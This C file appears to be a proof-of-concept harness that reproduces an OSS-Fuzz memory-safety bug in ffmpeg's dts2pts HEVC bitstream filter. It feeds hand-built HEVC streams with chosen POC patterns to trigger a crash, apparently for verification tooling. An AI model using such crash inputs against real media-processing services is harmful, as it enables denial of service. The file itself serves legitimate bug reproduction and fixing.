// PoC harness for OSSFUZZ-504281984 (ffmpeg dts2pts HEVC bsf tree invariant bug).
// Drives the real dts2pts bitstream filter (ff_dts2pts_bsf) through the
// public AVBSFContext API, like tools/target_bsf_fuzzer.c does, but feeding
// it a hand-built, syntactically-valid minimal HEVC Annex-B stream (built via
// the real CBS writer) whose POC pattern is chosen to hit the same_gop/
// dec_poc in-place AVTree key mutation in hevc_queue_frame().
//
// Frame sequence given on argv[1] as comma separated tokens "TYPE:LSB".
// Log verbosity via env POC_LOGLEVEL (numeric av_log level, default WARNING).
//
// Exit code convention: 0 = ran to completion without crashing (this
// includes the case where this target revision's dts2pts does not support
// HEVC at all yet, which is the expected, non-crashing outcome on
// pre-introduction revisions); nonzero only for a harness/setup usage
// error unrelated to the target (bad argv, allocation failure, etc). A
// crash inside the target aborts the process directly (SIGABRT/SIGSEGV
// under ASan), which is what the verification tooling detects.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

#include "libavcodec/avcodec.h"
#include "libavcodec/bsf.h"
#include "libavcodec/cbs.h"
#include "libavcodec/cbs_h265.h"
#include "libavcodec/packet.h"
#include "libavutil/mem.h"
#include "libavutil/log.h"

extern const AVBitStreamFilter ff_dts2pts_bsf;

static H265RawVPS g_vps;
static H265RawSPS g_sps;
static H265RawPPS g_pps;

static uint8_t dummy_slice_data[8] = { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };

#define LOG2_MAX_POC_LSB_MINUS4 0 /* -> log2_max_poc_lsb = 4, lsb range 0..15 */

static void build_vps(void)
{
    memset(&g_vps, 0, sizeof(g_vps));
    g_vps.nal_unit_header.nal_unit_type = HEVC_NAL_VPS;
    g_vps.nal_unit_header.nuh_layer_id = 0;
    g_vps.nal_unit_header.nuh_temporal_id_plus1 = 1;

    g_vps.vps_video_parameter_set_id = 0;
    g_vps.vps_base_layer_internal_flag = 1;
    g_vps.vps_base_layer_available_flag = 1;
    g_vps.vps_max_layers_minus1 = 0;
    g_vps.vps_max_sub_layers_minus1 = 0;
    g_vps.vps_temporal_id_nesting_flag = 1;

    g_vps.profile_tier_level.general_profile_idc = 1;
    g_vps.profile_tier_level.general_profile_compatibility_flag[1] = 1;
    g_vps.profile_tier_level.general_progressive_source_flag = 1;
    g_vps.profile_tier_level.general_frame_only_constraint_flag = 1;
    g_vps.profile_tier_level.general_level_idc = 90;

    g_vps.vps_sub_layer_ordering_info_present_flag = 1;
    g_vps.vps_max_dec_pic_buffering_minus1[0] = 4;
    g_vps.vps_max_num_reorder_pics[0] = 3;
    g_vps.vps_max_latency_increase_plus1[0] = 0;

    g_vps.vps_max_layer_id = 0;
    g_vps.vps_num_layer_sets_minus1 = 0;
    g_vps.layer_id_included_flag[0][0] = 1;
    g_vps.vps_timing_info_present_flag = 0;
    g_vps.vps_extension_flag = 0;
}

static void build_sps(void)
{
    memset(&g_sps, 0, sizeof(g_sps));
    g_sps.nal_unit_header.nal_unit_type = HEVC_NAL_SPS;
    g_sps.nal_unit_header.nuh_layer_id = 0;
    g_sps.nal_unit_header.nuh_temporal_id_plus1 = 1;

    g_sps.sps_video_parameter_set_id = 0;
    g_sps.sps_max_sub_layers_minus1 = 0;
    g_sps.sps_temporal_id_nesting_flag = 1;

    g_sps.profile_tier_level = g_vps.profile_tier_level;

    g_sps.sps_seq_parameter_set_id = 0;
    g_sps.chroma_format_idc = 1;
    g_sps.pic_width_in_luma_samples = 64;
    g_sps.pic_height_in_luma_samples = 64;
    g_sps.conformance_window_flag = 0;
    g_sps.bit_depth_luma_minus8 = 0;
    g_sps.bit_depth_chroma_minus8 = 0;

    g_sps.log2_max_pic_order_cnt_lsb_minus4 = LOG2_MAX_POC_LSB_MINUS4;

    g_sps.sps_sub_layer_ordering_info_present_flag = 1;
    g_sps.sps_max_dec_pic_buffering_minus1[0] = 4;
    g_sps.sps_max_num_reorder_pics[0] = 3;
    g_sps.sps_max_latency_increase_plus1[0] = 0;

    g_sps.log2_min_luma_coding_block_size_minus3 = 0;
    g_sps.log2_diff_max_min_luma_coding_block_size = 0;
    g_sps.log2_min_luma_transform_block_size_minus2 = 0;
    g_sps.log2_diff_max_min_luma_transform_block_size = 0;
    g_sps.max_transform_hierarchy_depth_inter = 0;
    g_sps.max_transform_hierarchy_depth_intra = 0;

    g_sps.scaling_list_enabled_flag = 0;
    g_sps.amp_enabled_flag = 0;
    g_sps.sample_adaptive_offset_enabled_flag = 0;
    g_sps.pcm_enabled_flag = 0;

    g_sps.num_short_term_ref_pic_sets = 0;
    g_sps.long_term_ref_pics_present_flag = 0;

    g_sps.sps_temporal_mvp_enabled_flag = 0;
    g_sps.strong_intra_smoothing_enabled_flag = 0;

    g_sps.vui_parameters_present_flag = 0;
    g_sps.vui.video_format = 5;
    g_sps.vui.colour_primaries = 2;
    g_sps.vui.transfer_characteristics = 2;
    g_sps.vui.matrix_coefficients = 2;
    g_sps.vui.motion_vectors_over_pic_boundaries_flag = 1;
    g_sps.vui.max_bytes_per_pic_denom = 2;
    g_sps.vui.max_bits_per_min_cu_denom = 1;
    g_sps.vui.log2_max_mv_length_horizontal = 15;
    g_sps.vui.log2_max_mv_length_vertical = 15;

    g_sps.sps_extension_present_flag = 0;
}

static void build_pps(void)
{
    memset(&g_pps, 0, sizeof(g_pps));
    g_pps.nal_unit_header.nal_unit_type = HEVC_NAL_PPS;
    g_pps.nal_unit_header.nuh_layer_id = 0;
    g_pps.nal_unit_header.nuh_temporal_id_plus1 = 1;

    g_pps.pps_pic_parameter_set_id = 0;
    g_pps.pps_seq_parameter_set_id = 0;

    g_pps.dependent_slice_segments_enabled_flag = 0;
    g_pps.output_flag_present_flag = 0;
    g_pps.num_extra_slice_header_bits = 0;
    g_pps.sign_data_hiding_enabled_flag = 0;
    g_pps.cabac_init_present_flag = 0;

    g_pps.num_ref_idx_l0_default_active_minus1 = 0;
    g_pps.num_ref_idx_l1_default_active_minus1 = 0;

    g_pps.init_qp_minus26 = 0;

    g_pps.constrained_intra_pred_flag = 0;
    g_pps.transform_skip_enabled_flag = 0;
    g_pps.cu_qp_delta_enabled_flag = 0;

    g_pps.pps_cb_qp_offset = 0;
    g_pps.pps_cr_qp_offset = 0;
    g_pps.pps_slice_chroma_qp_offsets_present_flag = 0;

    g_pps.weighted_pred_flag = 0;
    g_pps.weighted_bipred_flag = 0;

    g_pps.transquant_bypass_enabled_flag = 0;
    g_pps.tiles_enabled_flag = 0;
    g_pps.entropy_coding_sync_enabled_flag = 0;

    g_pps.pps_loop_filter_across_slices_enabled_flag = 0;
    g_pps.deblocking_filter_control_present_flag = 0;

    g_pps.pps_scaling_list_data_present_flag = 0;
    g_pps.lists_modification_present_flag = 0;
    g_pps.log2_parallel_merge_level_minus2 = 0;

    g_pps.slice_segment_header_extension_present_flag = 0;
    g_pps.pps_extension_present_flag = 0;
}

static int is_idr(int nal_type)
{
    return nal_type == HEVC_NAL_IDR_W_RADL || nal_type == HEVC_NAL_IDR_N_LP;
}

static void build_slice(H265RawSlice *slice, int nal_type, int poc_lsb)
{
    memset(slice, 0, sizeof(*slice));
    slice->header.nal_unit_header.nal_unit_type = nal_type;
    slice->header.nal_unit_header.nuh_layer_id = 0;
    slice->header.nal_unit_header.nuh_temporal_id_plus1 = 1;

    slice->header.first_slice_segment_in_pic_flag = 1;
    if (nal_type >= HEVC_NAL_BLA_W_LP && nal_type <= 23)
        slice->header.no_output_of_prior_pics_flag = 0;
    slice->header.slice_pic_parameter_set_id = 0;
    slice->header.slice_type = HEVC_SLICE_I;

    if (!is_idr(nal_type)) {
        slice->header.slice_pic_order_cnt_lsb = poc_lsb;
        slice->header.short_term_ref_pic_set_sps_flag = 1;
    }
    slice->header.slice_qp_delta = 0;

    /* Non-empty trailing "slice data" so that on re-read, the CBS h265
     * reader's more_rbsp_data() check succeeds. Content is irrelevant:
     * dts2pts only inspects the header fields. */
    slice->data = dummy_slice_data;
    slice->data_ref = NULL;
    slice->data_size = sizeof(dummy_slice_data);
    slice->data_bit_start = 0;
}

/* Reused across all AUs to avoid the overhead of allocating/freeing a CBS
 * context and packet per access unit (this harness may drive thousands of
 * AUs while searching for the trigger sequence). Parameter sets are only
 * sent once (in the first AU) since both the write-side and the BSF's own
 * internal read-side CBS contexts persist across calls, exactly like a
 * real elementary stream with out-of-band/one-shot parameter sets. */
static CodedBitstreamContext *g_wctx;
static AVPacket *g_wpkt;
static AVPacket *g_outpkt;

static int send_au(AVBSFContext *bsf, int64_t dts, int nal_type, int poc_lsb,
                    int include_params)
{
    CodedBitstreamFragment frag = { 0 };
    H265RawSlice slice;
    int ret;

    if (include_params) {
        ret = ff_cbs_insert_unit_content(&frag, -1, HEVC_NAL_VPS, &g_vps, NULL);
        if (ret < 0) { fprintf(stderr, "insert vps: %d\n", ret); exit(2); }
        ret = ff_cbs_insert_unit_content(&frag, -1, HEVC_NAL_SPS, &g_sps, NULL);
        if (ret < 0) { fprintf(stderr, "insert sps: %d\n", ret); exit(2); }
        ret = ff_cbs_insert_unit_content(&frag, -1, HEVC_NAL_PPS, &g_pps, NULL);
        if (ret < 0) { fprintf(stderr, "insert pps: %d\n", ret); exit(2); }
    }

    build_slice(&slice, nal_type, poc_lsb);
    ret = ff_cbs_insert_unit_content(&frag, -1, nal_type, &slice, NULL);
    if (ret < 0) { fprintf(stderr, "insert slice: %d\n", ret); exit(2); }

    ret = ff_cbs_write_packet(g_wctx, g_wpkt, &frag);
    ff_cbs_fragment_free(&frag);
    if (ret < 0) {
        fprintf(stderr, "ff_cbs_write_packet failed: %d (type=%d lsb=%d)\n",
                ret, nal_type, poc_lsb);
        return ret;
    }
    g_wpkt->dts = dts;
    g_wpkt->pts = AV_NOPTS_VALUE;
    g_wpkt->duration = 1;

    ret = av_bsf_send_packet(bsf, g_wpkt);
    if (ret < 0) {
        fprintf(stderr, "av_bsf_send_packet failed: %d\n", ret);
        return ret;
    }

    while ((ret = av_bsf_receive_packet(bsf, g_outpkt)) >= 0)
        av_packet_unref(g_outpkt);

    return 0;
}

struct au_desc { int nal_type; int poc_lsb; };

int main(int argc, char **argv)
{
    AVBSFContext *bsf = NULL;
    struct au_desc *aus;
    int cap = 8192;
    int n = 0;
    int ret;
    int loglevel = AV_LOG_WARNING;
    const char *ll = getenv("POC_LOGLEVEL");
    if (ll) loglevel = atoi(ll);

    av_log_set_level(loglevel);

    aus = av_malloc_array(cap, sizeof(*aus));

    if (argc > 1) {
        char *s = av_strdup(argv[1]);
        char *tok = strtok(s, ",");
        while (tok) {
            int type, lsb;
            if (n >= cap) {
                cap *= 2;
                aus = av_realloc_array(aus, cap, sizeof(*aus));
            }
            if (sscanf(tok, "%d:%d", &type, &lsb) == 2) {
                aus[n].nal_type = type;
                aus[n].poc_lsb = lsb;
                n++;
            }
            tok = strtok(NULL, ",");
        }
        av_free(s);
    } else {
        struct au_desc def[] = {
            { HEVC_NAL_IDR_W_RADL, 0 },
            { HEVC_NAL_TRAIL_R, 1 },
            { HEVC_NAL_TRAIL_R, 2 },
            { HEVC_NAL_TRAIL_R, 3 },
            { HEVC_NAL_TRAIL_R, 15 },
        };
        memcpy(aus, def, sizeof(def));
        n = sizeof(def) / sizeof(def[0]);
    }

    build_vps();
    build_sps();
    build_pps();

    ret = ff_cbs_init(&g_wctx, AV_CODEC_ID_HEVC, NULL);
    if (ret < 0) { fprintf(stderr, "ff_cbs_init failed: %d\n", ret); return 1; }
    g_wpkt = av_packet_alloc();
    g_outpkt = av_packet_alloc();

    ret = av_bsf_alloc(&ff_dts2pts_bsf, &bsf);
    if (ret < 0) { fprintf(stderr, "av_bsf_alloc failed: %d\n", ret); return 1; }

    bsf->par_in->codec_id = AV_CODEC_ID_HEVC;

    ret = av_bsf_init(bsf);
    if (ret < 0) {
        /* Expected, non-crashing outcome on revisions of dts2pts.c that do
         * not support HEVC yet (i.e. before the HEVC path -- and this bug
         * -- was added): report and exit 0 (ran to completion, no crash),
         * not an error. */
        fprintf(stderr,
                "av_bsf_init failed: %d (dts2pts does not accept HEVC on "
                "this revision -- expected pre-introduction behavior)\n",
                ret);
        av_bsf_free(&bsf);
        fprintf(stderr, "[poc] done, no crash\n");
        return 0;
    }

    for (int i = 0; i < n; i++) {
        ret = send_au(bsf, i, aus[i].nal_type, aus[i].poc_lsb, i == 0);
        if (ret < 0) {
            fprintf(stderr, "send_au %d failed: %d (stopping early)\n", i, ret);
            break;
        }
    }

    av_bsf_send_packet(bsf, NULL);
    while (av_bsf_receive_packet(bsf, g_outpkt) >= 0)
        av_packet_unref(g_outpkt);

    av_bsf_free(&bsf);
    fprintf(stderr, "[poc] done, no crash\n");
    return 0;
}
